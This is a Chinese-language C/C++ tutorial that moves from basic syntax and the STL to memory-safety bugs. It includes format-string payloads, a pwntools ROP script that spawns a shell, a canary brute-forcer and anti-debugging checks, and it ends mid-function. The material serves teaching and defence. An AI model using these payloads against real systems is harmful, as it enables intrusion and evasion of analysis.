# C/C++ 语言基础

## 目录

1. [C/C++ 简介](#1-cc-简介)
2. [环境配置](#2-环境配置)
3. [C 基础：变量、数据类型、运算符、输入输出](#3-c-基础变量数据类型运算符输入输出)
4. [控制流](#4-控制流)
5. [函数](#5-函数)
6. [数组与字符串](#6-数组与字符串)
7. [指针与引用](#7-指针与引用)
8. [结构体](#8-结构体)
9. [C++ 面向对象](#9-c-面向对象)
10. [STL 容器](#10-stl-容器)
11. [STL 算法](#11-stl-算法)
12. [文件操作](#12-文件操作)
13. [网络编程](#13-网络编程)
14. [正则表达式](#14-正则表达式)
15. [C/C++ 在安全领域的应用](#15-cc-在安全领域的应用)

---

## 1. C/C++ 简介

### 1.1 历史

- **C 语言**：1972 年由 Dennis Ritchie 在贝尔实验室设计，用于重写 UNIX 操作系统。是一门结构化、过程式的编程语言。
- **C++**：1983 年由 Bjarne Stroustrup 在贝尔实验室设计，最初称为 "C with Classes"。在 C 语言基础上增加了面向对象特性。
- **标准演进**：C++98 → C++03 → C++11 → C++14 → C++17 → C++20 → C++23

### 1.2 特点

| 特点 | 说明 |
|------|------|
| **高效** | 直接操作内存，编译为机器码，执行效率高 |
| **跨平台** | 源码级跨平台，需在各平台重新编译 |
| **手动内存管理** | 需要程序员自行管理堆内存（new/delete、malloc/free） |
| **面向对象** | 支持封装、继承、多态 |
| **泛型编程** | 模板（Template）机制 |
| **底层能力** | 可直接操作硬件、内存、指针 |

### 1.3 和安全的关系

C/C++ 是安全研究中最重要的编程语言之一，原因如下：

- **操作系统底层**：Windows、Linux、macOS 内核均由 C 编写
- **逆向分析**：大量软件（尤其是恶意软件）由 C/C++ 编译，逆向工程师需要理解 C/C++ 代码对应的汇编
- **漏洞挖掘**：内存安全漏洞（缓冲区溢出、Use-After-Free、整数溢出等）主要存在于 C/C++ 程序中
- **Exploit 开发**：Shellcode、ROP 链、内存破坏利用均需要深入理解 C/C++ 内存模型
- **安全工具开发**：调试器、反汇编器（IDA Pro 插件）、Fuzzer（AFL）常用 C/C++ 开发

---

## 2. 环境配置

### 2.1 Windows 平台

#### MinGW（GCC 的 Windows 版本）

1. 下载 MinGW-w64：https://www.mingw-w64.org/
2. 安装后将 `bin` 目录加入系统 PATH
3. 验证：打开 cmd，输入 `g++ --version`

#### Visual Studio

1. 下载 Visual Studio Community（免费）
2. 安装 "使用 C++ 的桌面开发" 工作负载
3. 使用 Developer Command Prompt 编译

### 2.2 Linux 平台

```bash
sudo apt update
sudo apt install build-essential   # Ubuntu/Debian
sudo yum groupinstall "Development Tools"  # CentOS/RHEL
gcc --version
g++ --version
```

### 2.3 编译运行

```bash
# 编译 C++ 程序
g++ hello.cpp -o hello

# 编译 C 程序
gcc hello.c -o hello

# 启用警告和调试信息
g++ -Wall -g hello.cpp -o hello

# 指定 C++ 标准
g++ -std=c++17 hello.cpp -o hello

# 运行
./hello          # Linux/Mac
hello.exe        # Windows
```

---

## 3. C 基础：变量、数据类型、运算符、输入输出

### 3.1 变量与数据类型

```cpp
// 基本数据类型
int a = 10;                 // 整数，通常 4 字节
short s = 100;              // 短整数，2 字节
long l = 100000L;           // 长整数，4 或 8 字节
long long ll = 123456789LL; // 长长整数，8 字节

float f = 3.14f;            // 单精度浮点数，4 字节
double d = 3.14159;         // 双精度浮点数，8 字节

char c = 'A';               // 字符，1 字节
bool b = true;              // 布尔值（C++），1 字节

// 无符号类型
unsigned int ui = 100;
unsigned char uc = 255;

// 常量
const int MAX = 100;
#define PI 3.14159  // C 风格宏定义
```

### 3.2 运算符

| 类型 | 运算符 |
|------|--------|
| 算术 | `+` `-` `*` `/` `%` `++` `--` |
| 关系 | `==` `!=` `>` `<` `>=` `<=` |
| 逻辑 | `&&` `||` `!` |
| 位运算 | `&` `\|` `^` `~` `<<` `>>` |
| 赋值 | `=` `+=` `-=` `*=` `/=` `%=` |
| 条件 | `?:` （三目运算符） |
| 指针 | `*` `&` `->` |
| 其他 | `sizeof` `,` `.` `[]` |

### 3.3 输入输出

C 风格：
```c
#include <stdio.h>

int main() {
    int num;
    char name[20];
    
    printf("请输入数字：");
    scanf("%d", &num);
    
    printf("请输入姓名：");
    scanf("%s", name);
    
    printf("数字：%d，姓名：%s\n", num, name);
    return 0;
}
```

C++ 风格：
```cpp
#include <iostream>
#include <string>
using namespace std;

int main() {
    int num;
    string name;
    
    cout << "请输入数字：";
    cin >> num;
    
    cout << "请输入姓名：";
    cin >> name;
    
    cout << "数字：" << num << "，姓名：" << name << endl;
    return 0;
}
```

---

## 4. 控制流

### 4.1 if / else

```cpp
int score = 85;

if (score >= 90) {
    cout << "优秀" << endl;
} else if (score >= 60) {
    cout << "及格" << endl;
} else {
    cout << "不及格" << endl;
}
```

### 4.2 for 循环

```cpp
for (int i = 0; i < 10; i++) {
    cout << i << " ";
}

// 范围 for 循环（C++11）
int arr[] = {1, 2, 3, 4, 5};
for (int x : arr) {
    cout << x << " ";
}
```

### 4.3 while / do-while

```cpp
int i = 0;
while (i < 10) {
    cout << i << " ";
    i++;
}

int j = 0;
do {
    cout << j << " ";
    j++;
} while (j < 10);
```

### 4.4 switch

```cpp
int day = 3;
switch (day) {
    case 1: cout << "星期一"; break;
    case 2: cout << "星期二"; break;
    case 3: cout << "星期三"; break;
    default: cout << "其他";
}
```

### 4.5 跳转语句

- `break`：跳出循环或 switch
- `continue`：跳过本次循环剩余部分
- `goto`：跳转到指定标签（不推荐滥用）
- `return`：从函数返回

---

## 5. 函数

### 5.1 函数定义

```cpp
// 返回类型 函数名(参数列表) { 函数体 }
int add(int a, int b) {
    return a + b;
}

// 无返回值函数
void print_hello() {
    cout << "Hello" << endl;
}
```

### 5.2 函数声明（原型）

```cpp
// 函数声明，可以放在调用之前
int add(int a, int b);

int main() {
    int result = add(3, 5);  // 调用函数
    return 0;
}
```

### 5.3 参数传递

```cpp
// 值传递
void swap_by_value(int a, int b) {
    int temp = a; a = b; b = temp;
}  // 不影响实参

// 指针传递
void swap_by_pointer(int* a, int* b) {
    int temp = *a; *a = *b; *b = temp;
}

// 引用传递（C++）
void swap_by_ref(int& a, int& b) {
    int temp = a; a = b; b = temp;
}
```

### 5.4 递归

```cpp
// 计算阶乘
int factorial(int n) {
    if (n <= 1) return 1;
    return n * factorial(n - 1);
}

// 斐波那契数列
int fibonacci(int n) {
    if (n <= 1) return n;
    return fibonacci(n - 1) + fibonacci(n - 2);
}
```

### 5.5 函数重载（C++）

```cpp
int max(int a, int b) {
    return a > b ? a : b;
}

double max(double a, double b) {
    return a > b ? a : b;
}
// 同名函数，参数类型不同，自动匹配
```

---

## 6. 数组与字符串

### 6.1 数组

```cpp
// 一维数组
int arr[5] = {1, 2, 3, 4, 5};
int nums[] = {10, 20, 30};  // 自动推断大小

// 访问
cout << arr[0];  // 第一个元素
arr[2] = 100;

// 二维数组
int matrix[3][3] = {
    {1, 2, 3},
    {4, 5, 6},
    {7, 8, 9}
};
```

### 6.2 C 风格字符串

```c
#include <string.h>

char str1[20] = "Hello";
char str2[] = "World";

// 字符串操作函数
strlen(str1);          // 长度：5
strcpy(str1, str2);    // 复制
strcat(str1, str2);    // 拼接
strcmp(str1, str2);    // 比较，0 表示相等
strchr(str1, 'e');     // 查找字符
```

**安全注意**：`strcpy`、`gets` 等函数不检查边界，容易导致缓冲区溢出。

### 6.3 C++ string 类

```cpp
#include <string>
using namespace std;

string s1 = "Hello";
string s2 = "World";

// 操作
string s3 = s1 + " " + s2;  // 拼接
s1.length();                // 长度
s1.find("lo");              // 查找
s1.substr(0, 3);            // 子串
s1.compare(s2);             // 比较
s1.c_str();                 // 转为 C 风格字符串（const char*）
```

---

## 7. 指针与引用

### 7.1 指针基础

```cpp
int x = 10;
int* p = &x;   // p 指向 x 的地址

cout << *p;    // 解引用，输出 10
*p = 20;       // 通过指针修改 x 的值
```

### 7.2 指针与数组

```cpp
int arr[5] = {1, 2, 3, 4, 5};
int* p = arr;   // 数组名是首元素地址

cout << *p;      // arr[0]
cout << *(p+1);  // arr[1]
cout << p[2];    // arr[2]，指针也可以用下标
```

### 7.3 动态内存分配

```cpp
// C 风格
int* p = (int*)malloc(sizeof(int) * 10);
free(p);

// C++ 风格
int* p = new int(10);       // 单个对象
delete p;

int* arr = new int[10];     // 数组
delete[] arr;
```

**安全注意**：忘记释放内存会导致内存泄漏；释放后继续使用会导致 Use-After-Free 漏洞。

### 7.4 引用（C++）

```cpp
int x = 10;
int& ref = x;   // ref 是 x 的引用（别名）

ref = 20;       // 修改 ref 就是修改 x
cout << x;      // 输出 20
```

引用 vs 指针：
- 引用必须在声明时初始化，且不能改变指向
- 引用更安全，不存在空引用
- 引用本质上是语法糖，底层通常用指针实现

### 7.5 空指针

```cpp
int* p = nullptr;   // C++11 推荐
int* p = NULL;      // C 风格宏
```

---

## 8. 结构体

### 8.1 定义与使用

```cpp
struct Student {
    int id;
    char name[20];
    int age;
    float score;
};

// 使用
Student s1;
s1.id = 1001;
strcpy(s1.name, "张三");
s1.age = 20;
s1.score = 95.5;

// 初始化
Student s2 = {1002, "李四", 21, 88.0};
```

### 8.2 结构体指针

```cpp
Student* p = &s1;
cout << p->id;     // 使用 -> 访问成员
cout << (*p).age;  // 等价写法
```

### 8.3 结构体数组

```cpp
Student class1[3] = {
    {1001, "张三", 20, 95.5},
    {1002, "李四", 21, 88.0},
    {1003, "王五", 19, 92.0}
};
```

### 8.4 内存对齐

结构体的内存布局可能因对齐而产生填充字节：

```cpp
struct Example {
    char a;    // 1 字节
    // 3 字节填充
    int b;     // 4 字节
    short c;   // 2 字节
    // 2 字节填充
};
// 总大小：12 字节（而非 7 字节）
```

可以使用 `#pragma pack(1)` 取消对齐（在逆向分析中常见）。

---

## 9. C++ 面向对象

### 9.1 类与对象

```cpp
#include <iostream>
using namespace std;

class Person {
private:
    string name;    // 私有成员
    int age;

public:
    // 构造函数
    Person(string n, int a) : name(n), age(a) {}

    // 成员函数
    void introduce() {
        cout << "我叫" << name << "，今年" << age << "岁" << endl;
    }

    // Getter / Setter
    string getName() { return name; }
    void setAge(int a) { age = a; }
};

int main() {
    Person p("张三", 20);
    p.introduce();
    p.setAge(21);
    return 0;
}
```

### 9.2 封装

- `public`：公开的，外部可访问
- `private`：私有的，只有类内部可访问
- `protected`：受保护的，子类可访问

### 9.3 继承

```cpp
class Student : public Person {
private:
    int student_id;

public:
    Student(string n, int a, int id) : Person(n, a), student_id(id) {}

    void study() {
        cout << getName() << "在学习" << endl;
    }
};
```

继承方式：
- `public` 继承：基类 public → 派生类 public，protected → protected
- `protected` 继承：基类 public/protected → 派生类 protected
- `private` 继承：基类所有成员 → 派生类 private

### 9.4 多态

```cpp
class Animal {
public:
    virtual void speak() {  // 虚函数
        cout << "动物叫" << endl;
    }
    virtual ~Animal() {}    // 虚析构函数
};

class Dog : public Animal {
public:
    void speak() override {
        cout << "汪汪汪" << endl;
    }
};

class Cat : public Animal {
public:
    void speak() override {
        cout << "喵喵喵" << endl;
    }
};

// 使用：基类指针指向派生类对象
Animal* a = new Dog();
a->speak();   // 输出 "汪汪汪"（动态绑定）
delete a;
```

### 9.5 虚函数表（vtable）

每个含有虚函数的类都有一张虚函数表，对象的前 4/8 字节是指向虚表的指针（vptr）。这是逆向分析中的重要概念。

---

## 10. STL 容器

### 10.1 vector（动态数组/列表）

```cpp
#include <vector>
#include <iostream>
using namespace std;

vector<int> v;

// 添加元素
v.push_back(10);
v.push_back(20);
v.push_back(30);

// 访问
cout << v[0];        // 下标访问
cout << v.at(1);     // 带边界检查
cout << v.front();   // 第一个元素
cout << v.back();    // 最后一个元素

// 大小
v.size();
v.empty();

// 删除
v.pop_back();        // 删除末尾
v.erase(v.begin());  // 删除指定位置

// 遍历
for (int i = 0; i < v.size(); i++)
    cout << v[i] << " ";

for (int x : v)      // C++11 范围 for
    cout << x << " ";
```

### 10.2 map（键值对/字典）

```cpp
#include <map>
#include <string>
using namespace std;

map<string, int> m;

// 插入
m["apple"] = 3;
m.insert(make_pair("banana", 5));

// 访问
cout << m["apple"];

// 查找
if (m.find("orange") != m.end()) {
    // 找到了
}

// 遍历
for (auto& pair : m) {
    cout << pair.first << ": " << pair.second << endl;
}

// 删除
m.erase("apple");
```

map 是有序的（基于红黑树），unordered_map 是哈希表实现。

### 10.3 string

```cpp
#include <string>
using namespace std;

string s = "Hello, World!";

// 常用操作
s.length();                    // 长度
s.substr(0, 5);                // 子串："Hello"
s.find("World");               // 查找位置：7
s.replace(7, 5, "C++");        // 替换
s.erase(0, 7);                 // 删除
s.insert(0, "Hi ");            // 插入

// 转换
s.c_str();                     // 转 const char*
stoi(s);                       // 转 int（C++11）
stod(s);                       // 转 double
to_string(123);                // 数字转 string
```

### 10.4 set（集合）

```cpp
#include <set>
using namespace std;

set<int> s;

s.insert(10);
s.insert(20);
s.insert(10);   // 重复元素不会被插入

s.count(10);    // 1（存在）
s.count(30);    // 0（不存在）

for (int x : s) cout << x << " ";
```

### 10.5 其他容器

- `list`：双向链表
- `deque`：双端队列
- `stack`：栈（适配器）
- `queue`：队列（适配器）
- `priority_queue`：优先队列
- `unordered_map` / `unordered_set`：哈希表

---

## 11. STL 算法

```cpp
#include <algorithm>
#include <vector>
using namespace std;

vector<int> v = {5, 2, 8, 1, 9, 3};

// 排序
sort(v.begin(), v.end());                  // 升序
sort(v.begin(), v.end(), greater<int>());  // 降序

// 查找
auto it = find(v.begin(), v.end(), 8);
if (it != v.end()) { /* 找到 */ }

// 计数
int cnt = count(v.begin(), v.end(), 5);

// 反转
reverse(v.begin(), v.end());

// 去重（需先排序）
sort(v.begin(), v.end());
auto last = unique(v.begin(), v.end());
v.erase(last, v.end());

// 遍历
for_each(v.begin(), v.end(), [](int x) {
    cout << x << " ";
});

// 最大值/最小值
int max_val = *max_element(v.begin(), v.end());
int min_val = *min_element(v.begin(), v.end());
```

---

## 12. 文件操作

### 12.1 C 风格文件操作

```c
#include <stdio.h>

// 写文件
FILE* fp = fopen("test.txt", "w");
if (fp) {
    fprintf(fp, "Hello, %s\n", "World");
    fputc('A', fp);
    fclose(fp);
}

// 读文件
FILE* fp = fopen("test.txt", "r");
if (fp) {
    char buf[100];
    fgets(buf, sizeof(buf), fp);  // 读一行
    printf("%s", buf);
    fclose(fp);
}
```

### 12.2 C++ 文件流

```cpp
#include <fstream>
#include <iostream>
#include <string>
using namespace std;

// 写文件
ofstream out("test.txt");
if (out.is_open()) {
    out << "Hello, World!" << endl;
    out << 123 << endl;
    out.close();
}

// 读文件
ifstream in("test.txt");
if (in.is_open()) {
    string line;
    while (getline(in, line)) {
        cout << line << endl;
    }
    in.close();
}
```

### 12.3 二进制文件

```cpp
ofstream out("data.bin", ios::binary);
int num = 12345;
out.write((char*)&num, sizeof(num));
out.close();

ifstream in("data.bin", ios::binary);
int num;
in.read((char*)&num, sizeof(num));
in.close();
```

---

## 13. 网络编程

### 13.1 Socket 基础

Linux 下的简单 TCP 客户端：

```cpp
#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
using namespace std;

int main() {
    // 创建 socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    // 设置服务器地址
    sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8080);
    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);
    
    // 连接
    connect(sockfd, (sockaddr*)&server_addr, sizeof(server_addr));
    
    // 发送数据
    const char* msg = "Hello Server";
    send(sockfd, msg, strlen(msg), 0);
    
    // 接收数据
    char buf[1024];
    int n = recv(sockfd, buf, sizeof(buf)-1, 0);
    buf[n] = '\0';
    cout << "收到：" << buf << endl;
    
    close(sockfd);
    return 0;
}
```

### 13.2 简单 TCP 服务器

```cpp
#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
using namespace std;

int main() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    
    sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(8080);
    
    bind(server_fd, (sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 5);
    
    cout << "监听 8080 端口..." << endl;
    
    while (true) {
        sockaddr_in client_addr;
        socklen_t len = sizeof(client_addr);
        int client_fd = accept(server_fd, (sockaddr*)&client_addr, &len);
        
        char buf[1024];
        int n = recv(client_fd, buf, sizeof(buf)-1, 0);
        buf[n] = '\0';
        cout << "收到：" << buf << endl;
        
        send(client_fd, buf, n, 0);  // 回显
        close(client_fd);
    }
    
    close(server_fd);
    return 0;
}
```

**Windows 下需使用 Winsock2**，初始化 `WSAStartup`，使用 `closesocket` 代替 `close`。

---

## 14. 正则表达式（C++11 regex）

```cpp
#include <iostream>
#include <string>
#include <regex>
using namespace std;

int main() {
    string s = "我的邮箱是 test@example.com 和 admin@test.org";

    // 匹配模式
    regex pattern(R"(\w+@\w+\.\w+)");

    // 搜索
    smatch match;
    if (regex_search(s, match, pattern)) {
        cout << "找到：" << match.str() << endl;
    }

    // 查找所有匹配
    auto begin = sregex_iterator(s.begin(), s.end(), pattern);
    auto end = sregex_iterator();
    for (auto i = begin; i != end; ++i) {
        cout << "匹配：" << i->str() << endl;
    }

    // 替换
    string result = regex_replace(s, pattern, "[邮箱已隐藏]");
    cout << result << endl;

    // 完全匹配
    string ip = "192.168.1.1";
    regex ip_pattern(R"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})");
    if (regex_match(ip, ip_pattern)) {
        cout << "是 IP 地址" << endl;
    }

    return 0;
}
```

编译时注意：部分旧版本 GCC 需要加 `-std=c++11`。

---

## 15. C/C++ 在安全领域的应用

### 15.1 逆向分析

- **静态分析**：使用 IDA Pro、Ghidra 等工具将二进制反编译为伪 C 代码
- **动态分析**：使用 x64dbg、OllyDbg、GDB 调试程序
- **关键能力**：
  - 理解 C/C++ 代码如何编译为汇编
  - 识别结构体、类、虚函数表
  - 理解调用约定（cdecl、stdcall、fastcall、thiscall）
  - 分析字符串、数组、指针的内存布局

### 15.2 漏洞挖掘

常见 C/C++ 漏洞类型：

| 漏洞类型 | 说明 | 相关函数 |
|----------|------|----------|
| **缓冲区溢出** | 向缓冲区写入超过其大小的数据 | `strcpy`、`sprintf`、`gets` |
| **栈溢出** | 栈上缓冲区溢出，可覆盖返回地址 | 同上 |
| **堆溢出** | 堆上缓冲区溢出，破坏堆结构 | `strcpy`、`memcpy` |
| **Use-After-Free** | 释放内存后继续使用 | `free` / `delete` |
| **Double Free** | 同一块内存释放两次 | `free` / `delete` |
| **整数溢出** | 整数运算超出范围，导致分配不足 | 各种运算 |
| **格式化字符串** | 格式化字符串参数可控 | `printf` 系列 |
| **越界读写** | 数组下标越界 | 数组操作 |

### 15.3 Exploit 开发

- **Shellcode 编写**：用汇编编写，注入到目标进程执行
- **ROP（Return-Oriented Programming）**：利用已有代码片段绕过 DEP
- **堆喷射（Heap Spraying）**：在堆上布置大量可控数据
- **信息泄露**：通过漏洞泄露内存地址，绕过 ASLR
- **相关工具**：pwntools（Python 库）、Metasploit

### 15.4 缓冲区溢出示例（概念）

```c
// 存在栈溢出漏洞的代码
void vulnerable_function(char* input) {
    char buffer[64];   // 64 字节缓冲区
    strcpy(buffer, input);  // 没有检查长度！
}

int main(int argc, char* argv[]) {
    vulnerable_function(argv[1]);
    return 0;
}
```

当输入超过 64 字节时，会覆盖栈上的返回地址，攻击者可以控制程序执行流。

### 15.5 安全开发建议

- 使用安全函数：`strncpy`、`snprintf`、`fgets`
- 开启编译器保护：`-fstack-protector`、`-D_FORTIFY_SOURCE=2`、`-fPIE`
- 开启操作系统保护：ASLR、DEP/NX、GS 保护
- 使用现代 C++ 特性：`std::string`、`std::vector` 代替裸指针和手动内存管理
- 使用内存检测工具：Valgrind、AddressSanitizer（ASAN）

---

## 参考资源

- [cppreference.com](https://en.cppreference.com/) — C++ 参考文档
- [cplusplus.com](http://www.cplusplus.com/) — C++ 教程
- 《C Primer Plus》— C 语言入门经典
- 《C++ Primer》— C++ 入门经典
- 《深入理解计算机系统》— 计算机系统基础
- 《漏洞战争》— 软件漏洞分析
- 《0day 安全：软件漏洞分析技术》— 漏洞挖掘与利用

---

## 16. 内存安全与漏洞利用深入

### 16.1 栈溢出原理与利用

```c
// 栈溢出原理
// 栈结构(从高地址到低地址):
// ┌──────────────────┐ 高地址
// │   函数参数        │
// ├──────────────────┤
// │   返回地址(EIP)   │ <- 被覆盖的目标
// ├──────────────────┤
// │   保存的EBP       │
// ├──────────────────┤
// │   局部变量(buffer)│ <- 溢出起点
// ├──────────────────┤
// │   ...             │
// └──────────────────┘ 低地址

// 存在漏洞的代码
#include <stdio.h>
#include <string.h>

void vulnerable(char* input) {
    char buffer[64];
    strcpy(buffer, input);  // 无边界检查
    printf("输入: %s\n", buffer);
}

// 利用payload结构:
// [填充字节(64+12)] + [返回地址(4/8)]
// E.g., python -c "print('A'*76 + '\xef\xbe\xad\xde')"

// 安全修复
void secure(char* input) {
    char buffer[64];
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';
    printf("输入: %s\n", buffer);
}

// 编译查看汇编
// gcc -S -fno-stack-protector vulnerable.c -o vulnerable.s
```

### 16.2 堆利用基础

```c
#include <stdlib.h>
#include <string.h>

// 堆内存管理结构(ptmalloc2)
// chunk结构:
// ┌──────────────┐
// | prev_size    | 前一个chunk的大小(如果已释放)
// ├──────────────┤
// | size | flags | 当前chunk大小 + 标志位(P/M/F)
// ├──────────────┤
// |              |
// |   user data  | 用户数据区
// |              |
// ├──────────────┤
// | next chunk   | 下一个chunk
// └──────────────┘

// Use-After-Free漏洞
class Data {
public:
    char data[32];
    void (*callback)(void);  // 函数指针

    Data() { callback = NULL; }
    virtual ~Data() {}
};

void exploit_uaf() {
    Data* obj1 = new Data();
    delete obj1;  // 释放对象

    // obj1指针仍然指向已释放的内存(悬垂指针)
    // 如果这块内存被重新分配给攻击者可控的数据
    // 攻击者可以覆盖callback函数指针

    char* attacker_data = new char[32];
    // ... 填充恶意函数地址 ...
    // obj1->callback();  // 调用攻击者指定的函数
}

// Double Free漏洞
void exploit_double_free() {
    char* ptr = (char*)malloc(64);
    free(ptr);
    // free(ptr);  // 再次释放同一块内存!
    // 这会破坏堆管理结构,可能导致任意地址写入
}

// 堆溢出
void heap_overflow() {
    char* a = (char*)malloc(32);
    char* b = (char*)malloc(32);
    // 如果写入a时超过32字节,会覆盖b的chunk头
    strcpy(a, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    // 这可能导致后续free(b)时产生任意地址写入
}
```

### 16.3 格式化字符串漏洞

```c
#include <stdio.h>

// 漏洞代码
void vulnerable_fmt(char* input) {
    printf(input);  // 用户输入直接作为格式化字符串!
}

// 攻击者输入:
// %x%x%x%x  -> 泄露栈上的数据
// %s        -> 读取指针指向的字符串
// %n        -> 将已输出字符数写入指定地址(最危险)
// AAAA%08x.%08x.%08x.%08x.%n  -> 向地址0x41414141写入数据

// 读取栈数据
// 输入: %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
// 输出: 00000001.0028ff44.41414141.38302530.30252e30...

// 写入任意地址
// 输入: \x90\xfe\xff\xbf%08x%08x%08x%08x%n
// 将值写入地址0xbffffe90

// 安全修复
void secure_fmt(char* input) {
    printf("%s", input);  // 使用明确的格式化字符串
}
```

### 16.4 整数溢出

```c
#include <stdlib.h>
#include <string.h>

// 整数溢出导致缓冲区分配不足
void vulnerable_alloc(size_t len) {
    // 如果len = 0xFFFFFFFF, 则 len+1 = 0(溢出)
    char* buf = (char*)malloc(len + 1);  // 分配0字节!
    // memcpy(buf, input, len);  // 写入0xFFFFFFFF字节 -> 堆溢出
}

// 乘法溢出
void vulnerable_multiply(size_t count, size_t elem_size) {
    // count * elem_size可能溢出
    // 如: count=0x100, elem_size=0x1000000
    // 结果: 0x100000000 -> 溢出为0(32位)
    char* buf = (char*)malloc(count * elem_size);
}

// 安全检查
void safe_alloc(size_t len) {
    if (len > SIZE_MAX - 1) {
        return;  // 检查加法溢出
    }
    char* buf = (char*)malloc(len + 1);
    if (buf) {
        // 安全使用
    }
}

void safe_multiply(size_t count, size_t elem_size) {
    if (count > SIZE_MAX / elem_size) {
        return;  // 检查乘法溢出
    }
    char* buf = (char*)malloc(count * elem_size);
}
```

---

## 17. 二进制保护机制与绕过

### 17.1 保护机制概览

```text
二进制保护机制:

| 保护机制 | 原理 | 绕过方法 |
|----------|------|----------|
| NX/DEP | 数据段不可执行 | ROP/JOP |
| ASLR | 地址随机化 | 信息泄露 |
| Canary | 栈保护,检测溢出 | 泄露Canary |
| RELRO | GOT只读 | Partial RELRO利用 |
| PIE | 可执行文件随机化 | 泄露PIE基址 |
| Fortify | 缓冲区函数检查 | 无通用绕过 |

编译选项:
  -fstack-protector        栈保护(Canary)
  -fstack-protector-all    所有函数都保护
  -fPIE -pie               位置无关可执行文件
  -Wl,-z,relro             RELRO(Partial)
  -Wl,-z,relro,-z,now      RELRO(Full)
  -D_FORTIFY_SOURCE=2      缓冲区函数增强
  -fcf-protection          控制流完整性(CET)

检查二进制保护:
  checksec ./binary
  # 或使用pwntools
  python3 -c "from pwn import *; print(ELF('./binary').checksec())"
```

### 17.2 ROP(Return-Oriented Programming)

```python
#!/usr/bin/env python3
"""ROP链构造示例(pwntools)"""

from pwn import *

# 目标程序: 存在栈溢出,开启了NX保护
# 需要使用ROP绕过DEP/NX

context.arch = 'amd64'  # 64位
context.log_level = 'debug'

# 加载二进制
elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 1. 寻找POP RDI; RET gadget
# 用于设置函数参数
rop = ROP(elf)

# 2. 泄露libc地址
# 调用puts(got['puts'])泄露puts的真实地址
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])  # 返回main再次溢出

# 构造payload
payload = b'A' * 72  # 填充到返回地址(64位: 64字节buffer + 8字节canary)
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])  # pop rdi; ret
payload += p64(elf.got['puts'])  # rdi = puts@got
payload += p64(elf.plt['puts'])  # 调用puts
payload += p64(elf.symbols['main'])  # 返回main

# 3. 获取泄露的libc地址
# p = process('./vulnerable')
# p.sendline(payload)
# leaked = u64(p.recv(6).ljust(8, b'\x00'))
# libc.address = leaked - libc.symbols['puts']

# 4. 构造system("/bin/sh")调用
# rop2 = ROP(libc)
# rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
# payload2 = b'A' * 72 + p64(rop2.find_gadget(['ret'])[0])
# payload2 += p64(rop2.find_gadget(['pop rdi', 'ret'])[0])
# payload2 += p64(next(libc.search(b'/bin/sh')))
# payload2 += p64(libc.symbols['system'])
# p.sendline(payload2)
# p.interactive()
```

### 17.3 Canary绕过

```python
#!/usr/bin/env python3
"""Canary泄露绕过"""

from pwn import *

# 方法1: 格式化字符串泄露Canary
# Canary通常以\x00开头,位于栈上buffer和返回地址之间
# 使用格式化字符串漏洞泄露栈数据

context.arch = 'amd64'

# 假设格式化字符串漏洞
# 泄露栈上的Canary值
# payload: %p.%p.%p... 直到泄露Canary

# 方法2: 逐字节爆破Canary
# 如果程序fork子进程处理请求
# 子进程的Canary与父进程相同
# 可以逐字节爆破(每字节最多256次尝试)

def brute_force_canary(p, padding_size):
    """逐字节爆破Canary"""
    canary = b'\x00'  # Canary第一字节总是\x00
    for i in range(1, 8):
        for byte in range(256):
            test_canary = canary + bytes([byte])
            payload = b'A' * padding_size + test_canary
            p.send(payload)
            response = p.recv()
            if b'crash' not in response:  # 没有崩溃
                canary = test_canary
                print(f"[+] Canary byte {i}: {hex(byte)}")
                break
    return canary

# 方法3: 覆盖Canary的同时保持其值
# 如果同时存在Canary泄露漏洞
```

---

## 18. 逆向分析基础

### 18.1 汇编语言基础

```text
x86/x64汇编关键指令:

通用寄存器(x64):
  RAX  累加器,也用于返回值
  RBX  基址寄存器
  RCX  计数器,第4个参数
  RDX  数据寄存器,第3个参数
  RSI  源索引,第2个参数
  RDI  目标索引,第1个参数
  RBP  基址指针(栈帧)
  RSP  栈指针
  R8-R15  第5-12个参数(x64)

调用约定:
  cdecl:     参数从右到左压栈,调用者清理栈 (C语言)
  stdcall:   参数从右到左压栈,被调用者清理 (Win32 API)
  fastcall:  前几个参数用寄存器 (ECX, EDX)
  thiscall:  C++成员函数, this在ECX (MSVC)
  x64:       前几个参数用寄存器 (RCX/RDI, RDX/RSI, R8, R9)

关键指令:
  mov  数据传送
  push/pop  栈操作
  call/ret  函数调用/返回
  jmp/jcc  跳转(无条件/条件)
  lea  加载有效地址
  test/cmp  比较
  nop  空操作(占位)

常见模式:
  函数序言: push rbp; mov rbp, rsp; sub rsp, 0x20
  函数结语: mov rsp, rbp; pop rbp; ret
```

### 18.2 反调试技术

```c
#include <stdio.h>
#include <windows.h>
#include <stdbool.h>

// 方法1: IsDebuggerPresent (Windows)
bool check_debugger_1() {
    return IsDebuggerPresent();
}

// 方法2: 检查PEB中的NtGlobalFlag
bool check_debugger_2() {
#ifdef _WIN64
    BYTE* peb = (BYTE*)__readgsqword(0x60);
#else
    BYTE* peb = (BYTE*)__readfsdword(0x30);
#endif
    DWORD flag = *(DWORD*)(peb + 0xBC);  // NtGlobalFlag
    return (flag & 0x70) != 0;  // FLG_HEAP_ENABLE_TAIL_CHECK等
}

// 方法3: 时间检测
bool check_debugger_3() {
    DWORD start = GetTickCount();
    // 执行一些操作
    for (volatile int i = 0; i < 100000; i++);
    DWORD elapsed = GetTickCount() - start;
